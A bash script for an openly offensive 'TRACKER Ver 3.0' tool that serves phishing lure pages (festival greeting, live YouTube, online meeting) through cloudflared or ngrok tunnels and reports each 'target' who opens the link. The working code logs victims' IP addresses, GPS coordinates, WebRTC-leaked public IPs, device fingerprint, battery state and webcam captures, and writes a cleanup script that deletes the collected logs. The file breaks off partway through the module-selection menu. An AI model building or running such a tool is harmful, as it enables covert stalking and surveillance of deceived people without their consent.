#!/bin/bash

trap 'printf "\n";stop' 2

banner() {
    clear
    printf "\e[1;92m╔══════════════════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;92m║  ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ \e[0m\n"
    printf "\e[1;92m║  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗\e[0m\n"
    printf "\e[1;92m║     ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝\e[0m\n"
    printf "\e[1;92m║     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗\e[0m\n"
    printf "\e[1;92m║     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║\e[0m\n"
    printf "\e[1;92m║     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\e[0m\n"
    printf "\e[1;92m╚══════════════════════════════════════════════════════════════╝\e[0m\n"
    printf "               \e[1;93mTRACKER Ver 3.0\e[0m\n"
    printf "          \e[1;77mAdvanced Tracking Tool\e[0m\n"
    printf "\n"
}

stop() {
    pkill -f "php -S 127.0.0.1:3333" 2>/dev/null
    pkill -f "cloudflared" 2>/dev/null
    pkill -f "ngrok" 2>/dev/null
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    cat ip.txt >> saved.ip.txt
}

catch_location() {
    local master_db="location_data/saved_locations.ndjson"
    
    if [[ ! -f "$master_db" ]]; then
        master_db="location_intel/saved_locations.ndjson"
        if [[ ! -f "$master_db" ]]; then
            printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
            return
        fi
    fi
    
    local latest
    latest=$(tail -1 "$master_db" 2>/dev/null)
    if [[ -z "$latest" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location data yet\e[0m\n"
        return
    fi
    
    printf "\n"
    printf "\e[1;95m═══════════════════════════════════════════════\e[0m\n"
    printf "\e[1;95m   LOCATION INTELLIGENCE REPORT\e[0m\n"
    printf "\e[1;95m═══════════════════════════════════════════════\e[0m\n"
    
    local capture_id
    capture_id=$(echo "$latest" | grep -o '"capture_id":"[^"]*"' | cut -d'"' -f4)
    local captured_at
    captured_at=$(echo "$latest" | grep -o '"captured_at":"[^"]*"' | cut -d'"' -f4)
    local client_ip
    client_ip=$(echo "$latest" | grep -o '"client_ip":"[^"]*"' | cut -d'"' -f4)
    
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Capture ID:\e[0m\e[1;77m %s\e[0m\n" "$capture_id"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Timestamp:\e[0m\e[1;77m %s\e[0m\n" "$captured_at"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Client IP:\e[0m\e[1;77m %s\e[0m\n" "$client_ip"
    
    # ── FIXED GPS PARSING (no -P flag, works on all grep) ──
    local gps_lat=""
    local gps_lon=""
    local gps_acc=""
    local gps_alt=""
    local gps_status=""

    # METHOD 1: Extract gps_lat/gps_lon as flat fields (from template.php JS)
    gps_lat=$(echo "$latest" | grep -oE '"gps_lat":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
    gps_lon=$(echo "$latest" | grep -oE '"gps_lon":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
    
    # If quoted string format
    if [[ -z "$gps_lat" ]]; then
        gps_lat=$(echo "$latest" | grep -oE '"gps_lat":"-?[0-9]+\.[0-9]+"' | head -1 | cut -d'"' -f4)
        gps_lon=$(echo "$latest" | grep -oE '"gps_lon":"-?[0-9]+\.[0-9]+"' | head -1 | cut -d'"' -f4)
    fi
    
    # METHOD 2: Inside collected -> gps block
    if [[ -z "$gps_lat" || "$gps_lat" == "null" ]]; then
        local collected_gps
        collected_gps=$(echo "$latest" | grep -oE '"gps":\{[^}]+\}' | head -1)
        if [[ -n "$collected_gps" ]]; then
            gps_lat=$(echo "$collected_gps" | grep -oE '"latitude":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
            gps_lon=$(echo "$collected_gps" | grep -oE '"longitude":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
            gps_acc=$(echo "$collected_gps" | grep -oE '"accuracy_m":[0-9.]+' | head -1 | cut -d: -f2)
            gps_alt=$(echo "$collected_gps" | grep -oE '"altitude_m":[0-9.]+' | head -1 | cut -d: -f2)
            gps_status=$(echo "$collected_gps" | grep -oE '"status":"[^"]+"' | head -1 | cut -d'"' -f4)
        fi
    fi
    
    # METHOD 3: lat/lon at root or in collected block
    if [[ -z "$gps_lat" || "$gps_lat" == "null" ]]; then
        gps_lat=$(echo "$latest" | grep -oE '"lat":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
        gps_lon=$(echo "$latest" | grep -oE '"lon":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
    fi
    
    # METHOD 4: Inside "collected" block
    if [[ -z "$gps_lat" || "$gps_lat" == "null" ]]; then
        local collected_block
        collected_block=$(echo "$latest" | grep -oE '"collected":\{[^}]+\}' | head -1)
        if [[ -n "$collected_block" ]]; then
            gps_lat=$(echo "$collected_block" | grep -oE '"gps_lat":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
            gps_lon=$(echo "$collected_block" | grep -oE '"gps_lon":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
            if [[ -z "$gps_lat" ]]; then
                gps_lat=$(echo "$collected_block" | grep -oE '"lat":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
                gps_lon=$(echo "$collected_block" | grep -oE '"lon":-?[0-9]+\.[0-9]+' | head -1 | cut -d: -f2)
            fi
        fi
    fi
    
    # METHOD 5: Last resort - search anywhere for any lat/lon pair
    if [[ -z "$gps_lat" || "$gps_lat" == "null" ]]; then
        gps_lat=$(echo "$latest" | grep -oE '"[lg][ap][st]_?lat"[ :]+-?[0-9]+\.[0-9]+' | head -1 | grep -oE '-?[0-9]+\.[0-9]+' | head -1)
        gps_lon=$(echo "$latest" | grep -oE '"[lg][ap][st]_?lon"[ :]+-?[0-9]+\.[0-9]+' | head -1 | grep -oE '-?[0-9]+\.[0-9]+' | head -1)
    fi
    
    # Accuracy
    if [[ -z "$gps_acc" ]]; then
        gps_acc=$(echo "$latest" | grep -oE '"gps_acc":[0-9.]+' | head -1 | cut -d: -f2)
        if [[ -z "$gps_acc" ]]; then
            gps_acc=$(echo "$latest" | grep -oE '"accuracy":[0-9.]+' | head -1 | cut -d: -f2 | head -1)
        fi
    fi
    
    # Altitude
    if [[ -z "$gps_alt" ]]; then
        gps_alt=$(echo "$latest" | grep -oE '"gps_alt":[0-9.]+' | head -1 | cut -d: -f2)
        if [[ -z "$gps_alt" ]]; then
            gps_alt=$(echo "$latest" | grep -oE '"altitude":[0-9.]+' | head -1 | cut -d: -f2 | head -1)
        fi
    fi
    
    # Status detection
    if [[ -z "$gps_status" ]]; then
        local gps_error
        gps_error=$(echo "$latest" | grep -oE '"gps_error":[0-9]+' | head -1 | cut -d: -f2)
        local gps_msg
        gps_msg=$(echo "$latest" | grep -oE '"gps_msg":"[^"]+"' | head -1 | cut -d'"' -f4)
        
        if [[ -n "$gps_lat" && "$gps_lat" != "null" ]] && [[ $(echo "$gps_lat" | grep -c '[0-9]') -gt 0 ]]; then
            gps_status="captured"
        elif [[ "$gps_msg" == *"denied"* ]] || [[ "$gps_msg" == *"Permission"* ]]; then
            gps_status="denied"
        elif [[ -n "$gps_error" ]]; then
            gps_status="error"
        fi
    fi
    
    # ── Display GPS ──
    if [[ "$gps_status" == "captured" ]]; then
        local maps_link
        maps_link="https://www.google.com/maps/place/${gps_lat},${gps_lon}"
        
        printf "\n"
        printf "\e[1;92m╔══ GPS COORDINATES CAPTURED ═══════════════╗\e[0m\n"
        printf "\e[1;92m║\e[0m\n"
        printf "\e[1;92m║  \e[1;93mLatitude:\e[0m  \e[1;97m%s\e[0m\n" "$gps_lat"
        printf "\e[1;92m║  \e[1;93mLongitude:\e[0m \e[1;97m%s\e[0m\n" "$gps_lon"
        if [[ -n "$gps_acc" && "$gps_acc" != "null" ]]; then
            printf "\e[1;92m║  \e[1;93mAccuracy:\e[0m  \e[1;97m%s meters\e[0m\n" "$gps_acc"
        fi
        if [[ -n "$gps_alt" && "$gps_alt" != "null" ]]; then
            printf "\e[1;92m║  \e[1;93mAltitude:\e[0m  \e[1;97m%s meters\e[0m\n" "$gps_alt"
        fi
        printf "\e[1;92m║\e[0m\n"
        printf "\e[1;92m║  \e[1;94mGoogle Maps:\e[0m\n"
        printf "\e[1;92m║  \e[1;77m%s\e[0m\n" "$maps_link"
        printf "\e[1;92m║\e[0m\n"
        printf "\e[1;92m╚══════════════════════════════════════════╝\e[0m\n"
    elif [[ "$gps_status" == "denied" ]]; then
        printf "\n\e[1;93m[!] GPS: Permission denied by user\e[0m\n"
    elif [[ "$gps_status" == "error" ]]; then
        printf "\n\e[1;93m[!] GPS: Error occurred during capture\e[0m\n"
    else
        local has_gps_field
        has_gps_field=$(echo "$latest" | grep -cE '"(gps_lat|gps_lon|gps|latitude|longitude)"')
        if [[ "$has_gps_field" -gt 0 ]]; then
            printf "\n\e[1;93m[!] GPS: Data present but could not be parsed\e[0m\n"
        else
            printf "\n\e[1;93m[!] GPS: Not available\e[0m\n"
        fi
    fi
    
    # ── WebRTC ──
    local webrtc_block
    webrtc_block=$(echo "$latest" | grep -oE '"webrtc":\{[^}]+\}')
    
    if [[ -n "$webrtc_block" ]]; then
        local webrtc_status
        webrtc_status=$(echo "$webrtc_block" | grep -oE '"status":"[^"]+"' | cut -d'"' -f4)
        
        if [[ "$webrtc_status" == "captured" ]]; then
            local public_ips
            public_ips=$(echo "$webrtc_block" | grep -oE '"ips_public":\[[^\]]+\]' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
            
            printf "\n"
            printf "\e[1;93m╔══ WEBRTC IP LEAK ═══════════════════════════╗\e[0m\n"
            
            if [[ -n "$public_ips" ]]; then
                local ip_count=0
                while IFS= read -r ip; do
                    ip_count=$((ip_count + 1))
                    printf "\e[1;93m║  \e[1;92mPublic IP #%d:\e[0m  \e[1;97m%s\e[0m\n" "$ip_count" "$ip"
                done <<< "$public_ips"
            fi
            
            local webrtc_direct
            webrtc_direct=$(echo "$latest" | grep -oE '"webrtc_ip":"[^"]+"' | cut -d'"' -f4)
            if [[ -n "$webrtc_direct" ]]; then
                local direct_ips
                direct_ips=$(echo "$webrtc_direct" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
                if [[ -n "$direct_ips" ]]; then
                    while IFS= read -r ip; do
                        if ! echo "$public_ips" | grep -q "$ip"; then
                            ip_count=$((ip_count + 1))
                            printf "\e[1;93m║  \e[1;92mPublic IP #%d:\e[0m  \e[1;97m%s\e[0m\n" "$ip_count" "$ip"
                        fi
                    done <<< "$direct_ips"
                fi
            fi
            
            printf "\e[1;93m╚══════════════════════════════════════════════╝\e[0m\n"
        fi
    else
        local webrtc_direct
        webrtc_direct=$(echo "$latest" | grep -oE '"webrtc_ip":"[^"]+"' | cut -d'"' -f4)
        if [[ -n "$webrtc_direct" ]]; then
            local direct_ips
            direct_ips=$(echo "$webrtc_direct" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
            if [[ -n "$direct_ips" ]]; then
                printf "\n"
                printf "\e[1;93m╔══ WEBRTC IP LEAK ═══════════════════════════╗\e[0m\n"
                local ip_count=0
                while IFS= read -r ip; do
                    ip_count=$((ip_count + 1))
                    printf "\e[1;93m║  \e[1;92mPublic IP #%d:\e[0m  \e[1;97m%s\e[0m\n" "$ip_count" "$ip"
                done <<< "$direct_ips"
                printf "\e[1;93m╚══════════════════════════════════════════════╝\e[0m\n"
            fi
        fi
    fi
    
    # ── IP Geolocation ──
    local ip_geo_block
    ip_geo_block=$(echo "$latest" | grep -oE '"ip_geo":\{[^}]+\}' | head -1)
    
    if [[ -n "$ip_geo_block" ]]; then
        local geo_source
        geo_source=$(echo "$ip_geo_block" | grep -oE '"source":"[^"]+"' | cut -d'"' -f4)
        
        if [[ -n "$geo_source" && "$geo_source" != "failed" && "$geo_source" != "local_network" ]]; then
            local geo_data
            geo_data=$(echo "$ip_geo_block" | grep -oE '"data":\{[^}]+\}')
            
            local geo_country="" geo_region="" geo_city="" geo_isp="" geo_org="" geo_lat="" geo_lon="" geo_zip=""
            
            geo_country=$(echo "$geo_data" | grep -oE '"country":"[^"]+"' | cut -d'"' -f4)
            geo_region=$(echo "$geo_data" | grep -oE '"regionName":"[^"]+"' | cut -d'"' -f4)
            geo_city=$(echo "$geo_data" | grep -oE '"city":"[^"]+"' | cut -d'"' -f4)
            geo_isp=$(echo "$geo_data" | grep -oE '"isp":"[^"]+"' | cut -d'"' -f4)
            geo_org=$(echo "$geo_data" | grep -oE '"org":"[^"]+"' | cut -d'"' -f4)
            geo_lat=$(echo "$geo_data" | grep -oE '"lat":-?[0-9.]+' | head -1 | cut -d: -f2)
            geo_lon=$(echo "$geo_data" | grep -oE '"lon":-?[0-9.]+' | head -1 | cut -d: -f2)
            geo_zip=$(echo "$geo_data" | grep -oE '"zip":"[^"]+"' | cut -d'"' -f4)
            
            if [[ -n "$geo_country" && "$geo_country" != "N/A" && "$geo_country" != "null" ]] || [[ -n "$geo_city" && "$geo_city" != "N/A" && "$geo_city" != "null" ]]; then
                printf "\n"
                printf "\e[1;96m╔══ IP GEOLOCATION (%s) ═══════════════════╗\e[0m\n" "$geo_source"
                printf "\e[1;96m║\e[0m\n"
                
                if [[ -n "$geo_country" && "$geo_country" != "N/A" && "$geo_country" != "null" ]]; then
                    printf "\e[1;96m║  \e[1;93mCountry:\e[0m  \e[1;97m%s\e[0m\n" "$geo_country"
                fi
                if [[ -n "$geo_region" && "$geo_region" != "N/A" && "$geo_region" != "null" ]]; then
                    printf "\e[1;96m║  \e[1;93mRegion:\e[0m   \e[1;97m%s\e[0m\n" "$geo_region"
                fi
                if [[ -n "$geo_city" && "$geo_city" != "N/A" && "$geo_city" != "null" ]]; then
                    printf "\e[1;96m║  \e[1;93mCity:\e[0m     \e[1;97m%s\e[0m\n" "$geo_city"
                fi
                if [[ -n "$geo_zip" && "$geo_zip" != "N/A" && "$geo_zip" != "null" ]]; then
                    printf "\e[1;96m║  \e[1;93mZIP Code:\e[0m \e[1;97m%s\e[0m\n" "$geo_zip"
                fi
                if [[ -n "$geo_lat" && "$geo_lat" != "null" && -n "$geo_lon" && "$geo_lon" != "null" ]]; then
                    printf "\e[1;96m║  \e[1;93mGeo Loc:\e[0m  \e[1;97m%s, %s\e[0m\n" "$geo_lat" "$geo_lon"
                fi
                if [[ -n "$geo_isp" && "$geo_isp" != "N/A" && "$geo_isp" != "null" ]]; then
                    printf "\e[1;96m║  \e[1;93mISP:\e[0m      \e[1;97m%s\e[0m\n" "$geo_isp"
                fi
                if [[ -n "$geo_org" && "$geo_org" != "N/A" && "$geo_org" != "null" ]]; then
                    printf "\e[1;96m║  \e[1;93mOrg:\e[0m      \e[1;97m%s\e[0m\n" "$geo_org"
                fi
                
                printf "\e[1;96m║\e[0m\n"
                printf "\e[1;96m╚══════════════════════════════════════════════╝\e[0m\n"
            fi
        elif [[ "$geo_source" == "failed" ]]; then
            printf "\n\e[1;93m[!] IP Geolocation: API lookup failed\e[0m\n"
        elif [[ "$geo_source" == "local_network" ]]; then
            printf "\n\e[1;93m[!] IP Geolocation: Local/private network (127.0.0.1)\e[0m\n"
        fi
    fi
    
    # ── Device ──
    local device_block
    device_block=$(echo "$latest" | grep -oE '"device":\{[^}]+\}')
    
    if [[ -n "$device_block" ]]; then
        local dev_screen dev_timezone dev_lang dev_platform dev_concurrency dev_memory
        
        dev_screen=$(echo "$device_block" | grep -oE '"screen":"[^"]+"' | cut -d'"' -f4)
        dev_timezone=$(echo "$device_block" | grep -oE '"timezone":"[^"]+"' | cut -d'"' -f4)
        dev_lang=$(echo "$device_block" | grep -oE '"language":"[^"]+"' | cut -d'"' -f4)
        dev_platform=$(echo "$device_block" | grep -oE '"platform":"[^"]+"' | cut -d'"' -f4)
        dev_concurrency=$(echo "$device_block" | grep -oE '"hardwareConcurrency":[0-9]+' | cut -d: -f2)
        dev_memory=$(echo "$device_block" | grep -oE '"deviceMemory":[0-9.]+' | cut -d: -f2)
        
        printf "\n"
        printf "\e[1;95m╔══ DEVICE FINGERPRINT ══════════════════════╗\e[0m\n"
        
        if [[ -n "$dev_screen" ]]; then
            printf "\e[1;95m║  \e[1;93mScreen:\e[0m     \e[1;97m%s\e[0m\n" "$dev_screen"
        fi
        if [[ -n "$dev_timezone" ]]; then
            printf "\e[1;95m║  \e[1;93mTimezone:\e[0m   \e[1;97m%s\e[0m\n" "$dev_timezone"
        fi
        if [[ -n "$dev_lang" ]]; then
            printf "\e[1;95m║  \e[1;93mLanguage:\e[0m   \e[1;97m%s\e[0m\n" "$dev_lang"
        fi
        if [[ -n "$dev_platform" ]]; then
            printf "\e[1;95m║  \e[1;93mPlatform:\e[0m   \e[1;97m%s\e[0m\n" "$dev_platform"
        fi
        if [[ -n "$dev_concurrency" ]]; then
            printf "\e[1;95m║  \e[1;93mCPU Cores:\e[0m  \e[1;97m%s\e[0m\n" "$dev_concurrency"
        fi
        if [[ -n "$dev_memory" ]]; then
            printf "\e[1;95m║  \e[1;93mRAM:\e[0m        \e[1;97m%s GB\e[0m\n" "$dev_memory"
        fi
        
        printf "\e[1;95m╚══════════════════════════════════════════════╝\e[0m\n"
    fi
    
    # ── Battery ──
    local battery_block
    battery_block=$(echo "$latest" | grep -oE '"battery":\{[^}]+\}')
    
    if [[ -n "$battery_block" ]]; then
        local batt_level batt_charging
        batt_level=$(echo "$battery_block" | grep -oE '"level":[0-9.]+' | cut -d: -f2)
        batt_charging=$(echo "$battery_block" | grep -oE '"charging":(true|false)' | cut -d: -f2)
        
        if [[ -n "$batt_level" ]]; then
            local batt_percent
            batt_percent=$(echo "$batt_level * 100" | bc 2>/dev/null || printf "%.0f" $(echo "$batt_level * 100" | bc -l 2>/dev/null) 2>/dev/null)
            
            printf "\n"
            printf "\e[1;93m[+] Battery:\e[0m \e[1;97m%s%%\e[0m" "$batt_percent"
            if [[ "$batt_charging" == "true" ]]; then
                printf " \e[1;92m(Charging)\e[0m"
            fi
            printf "\n"
        fi
    fi
    
    # ── User-Agent ──
    local ua
    ua=$(echo "$latest" | grep -oE '"user_agent":"[^"]+"' | head -1 | cut -d'"' -f4)
    if [[ -z "$ua" || "$ua" == "Unknown" ]]; then
        ua=$(echo "$latest" | grep -oE '"user_agent":"[^"]+"' | tail -1 | cut -d'"' -f4)
    fi
    if [[ -n "$ua" && "$ua" != "Unknown" ]]; then
        printf "\n"
        printf "\e[1;93m[+] User-Agent:\e[0m \e[1;77m%s\e[0m\n" "$ua"
    fi
    
    printf "\n"
    printf "\e[1;95m═══════════════════════════════════════════════\e[0m\n"
    printf "\n"
}

catch_image() {
    local capture_dir="captures"
    if [[ ! -d "$capture_dir" ]]; then
        return
    fi
    
    local latest_img
    latest_img=$(ls -t "$capture_dir"/cam_*.{png,jpg} 2>/dev/null | head -1)
    if [[ -n "$latest_img" ]]; then
        local img_size
        img_size=$(du -h "$latest_img" | cut -f1)
        local img_name
        img_name=$(basename "$latest_img")
        printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Image captured:\e[0m\e[1;77m %s (%s)\e[0m\n" "$img_name" "$img_size"
    fi
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets, Press Ctrl + C to exit...\e[0m\n"
    
    if [[ $track_location -eq 1 ]]; then
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
    else
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;91mDISABLED\e[0m\n"
    fi
    
    if [[ $track_webcam -eq 1 ]]; then
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Webcam capture is \e[0m\e[1;93mACTIVE\e[0m\n"
    else
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Webcam capture is \e[0m\e[1;91mDISABLED\e[0m\n"
    fi
    
    local last_size=0
    local last_line_count=0
    local last_img_count=0
    local master_db="location_data/saved_locations.ndjson"
    local capture_dir="captures"
    
    mkdir -p "$capture_dir"
    
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            catch_ip
            rm -rf ip.txt
        fi
        
        if [[ $track_location -eq 1 ]] && [[ -f "$master_db" ]]; then
            local current_line_count
            current_line_count=$(wc -l < "$master_db" 2>/dev/null || echo 0)
            
            if [[ "$current_line_count" -gt "$last_line_count" ]]; then
                printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received! (entry #%d)\e[0m\n" "$current_line_count"
                catch_location
                last_line_count="$current_line_count"
            fi
            
            local current_size
            current_size=$(stat -c%s "$master_db" 2>/dev/null || echo 0)
            if [[ "$current_size" -gt "$last_size" ]]; then
                last_size="$current_size"
            fi
        fi
        
        if [[ $track_webcam -eq 1 ]] && [[ -d "$capture_dir" ]]; then
            local current_img_count
            current_img_count=$(ls -1 "$capture_dir"/cam_*.{png,jpg} 2>/dev/null | wc -l)
            if [[ "$current_img_count" -gt "$last_img_count" ]]; then
                printf "\n\e[1;92m[\e[0m+\e[1;92m] Webcam image received!\e[0m\n"
                catch_image
                last_img_count="$current_img_count"
            fi
        fi
        
        sleep 1
    done 
}

start_ip_logger() {
    cat << 'EOF' > ip.php
<?php
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
}
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$timestamp = date('Y-m-d H:i:s');

$log_entry = "IP: $ip | Time: $timestamp | UA: $user_agent\n";
file_put_contents('ip.txt', $log_entry, FILE_APPEND | LOCK_EX);

$visitor_entry = json_encode([
    'ip' => $ip,
    'user_agent' => $user_agent,
    'timestamp' => $timestamp,
    'referer' => $_SERVER['HTTP_REFERER'] ?? '-',
]);
file_put_contents('logs/visitors.ndjson', $visitor_entry . PHP_EOL, FILE_APPEND | LOCK_EX);

header('Content-Type: image/gif');
header('Cache-Control: no-store, no-cache, must-revalidate');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
EOF
    echo "ip.php created"
}

create_cleanup_script() {
    cat << 'EOF' > cleanup.sh
#!/bin/bash
echo "Starting cleanup of unnecessary files and logs..."

echo "Removing log files..."
rm -f *.log
rm -f .cloudflared.log

echo "Removing temporary location files..."
rm -f location_*.txt
rm -f current_location.bak

echo "Removing captured images..."
rm -f cam*.png
rm -f captures/cam*.png captures/cam*.jpg captures/cam*.webp 2>/dev/null

echo "Removing temporary HTML files..."
rm -f index.php
rm -f index2.html
rm -f index3.html

echo "Cleaning saved locations directory..."
if [ -d "location_data" ]; then
    rm -f location_data/*.ndjson
    rm -f location_data/daily/* 2>/dev/null
    rm -f location_data/sessions/* 2>/dev/null
fi

if [ -d "location_intel" ]; then
    rm -f location_intel/*.ndjson
    rm -f location_intel/daily/* 2>/dev/null
    rm -f location_intel/sessions/* 2>/dev/null
fi

echo "Removing other temporary files..."
rm -f LocationLog.log
rm -f LocationError.log
rm -f Log.log
rm -f ip.txt
rm -f visitors.log

echo "Cleanup completed successfully!"
EOF
    chmod +x cleanup.sh
    echo "cleanup.sh created"
}

cloudflare_tunnel() {
    [[ -e cloudflared ]] && { echo ""; } || {
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
        chmod +x cloudflared
    }
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
    rm -rf .cloudflared.log > /dev/null 2>&1
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
    
    sleep 10
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Direct link not generating\e[0m\n"
        exit 1
    fi
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
    payload_cloudflare
    checkfound
}

payload_cloudflare() {
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
    
    generate_template
    
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    
    if [[ $track_webcam -eq 1 ]]; then
        if [[ $option_tem -eq 1 ]]; then
            sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
            sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
        elif [[ $option_tem -eq 2 ]]; then
            sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
            sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
        else
            sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
        fi
        rm -rf index3.html 2>/dev/null
        sed -i 's+forwarding_link/post.php+'$link'/post.php+g' index2.html 2>/dev/null
        sed -i 's+forwarding_link+'$link'+g' index2.html 2>/dev/null
    fi
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Payload files generated:\e[0m\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] Landing page:\e[0m\e[1;77m %s/index.php\e[0m\n" $link
    if [[ $track_webcam -eq 1 ]]; then
        printf "\e[1;92m[\e[0m*\e[1;92m] Redirect page:\e[0m\e[1;77m %s/index2.html\e[0m\n" $link
    fi
}

ngrok_server() {
    [[ -e ngrok ]] && { echo ""; } || {
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok.zip
    }
    
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
    ./ngrok authtoken $ngrok_auth > /dev/null 2>&1
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    
    sleep 10
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Direct link not generating\e[0m\n"
        exit 1
    fi
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
    payload_ngrok
    checkfound
}

payload_ngrok() {
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
    
    generate_template
    
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    
    if [[ $track_webcam -eq 1 ]]; then
        if [[ $option_tem -eq 1 ]]; then
            sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
            sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
        elif [[ $option_tem -eq 2 ]]; then
            sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
            sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
        else
            sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
        fi
        rm -rf index3.html 2>/dev/null
        sed -i 's+forwarding_link/post.php+'$link'/post.php+g' index2.html 2>/dev/null
        sed -i 's+forwarding_link+'$link'+g' index2.html 2>/dev/null
    fi
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Payload files generated:\e[0m\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] Landing page:\e[0m\e[1;77m %s/index.php\e[0m\n" $link
    if [[ $track_webcam -eq 1 ]]; then
        printf "\e[1;92m[\e[0m*\e[1;92m] Redirect page:\e[0m\e[1;77m %s/index2.html\e[0m\n" $link
    fi
}

select_tracking_modules() {
    printf "\n\e[1;93m═══════ Tracking Modules Selection ═══════\e[0m\n"
    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Location Only\e[0m (GPS + WebRTC IP + Device info)\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Webcam Only\e[0m (Camera capture + redirect to lure page)\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Both\e[0m (Location + Webcam - full tracking)\n"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose tracking mode: [Default is 1] \e[0m' track_option
